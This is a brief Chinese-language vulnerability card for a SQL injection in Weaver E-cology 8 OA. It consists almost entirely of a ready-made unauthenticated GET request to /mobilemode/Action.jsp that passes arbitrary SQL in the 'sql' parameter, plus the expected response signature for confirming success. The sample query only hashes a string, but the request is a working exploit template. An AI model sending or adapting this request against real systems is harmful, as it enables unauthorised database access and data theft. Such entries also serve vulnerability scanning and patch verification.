# 泛微E-cology8Action.jspSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1 HTTP/1`
- **响应特征**：-1 0xe10adc3949